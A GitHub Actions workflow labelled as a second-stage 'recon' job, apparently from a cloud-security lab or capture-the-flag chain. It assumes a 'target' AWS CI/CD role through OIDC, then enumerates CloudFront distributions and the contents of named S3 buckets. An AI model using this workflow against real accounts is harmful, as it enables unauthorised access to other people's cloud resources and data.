name: Stage2

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  recon:
    runs-on: ubuntu-latest

    steps:
      - name: Assume target CICD role
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Verify target account
        run: |
          aws sts get-caller-identity

      - name: List CloudFront distributions
        run: |
          aws cloudfront list-distributions \
            --query 'DistributionList.Items[].{Id:Id,Domain:DomainName,Origins:Origins.Items[].DomainName}' \
            --output json

      - name: Test target buckets
        run: |
          aws s3api list-objects-v2 \
            --bucket userad88e2b168aa387e \
            --max-items 5 \
            --output json

          aws s3api list-objects-v2 \
            --bucket logad88e2b168aa387e \
            --max-items 5 \
            --output json
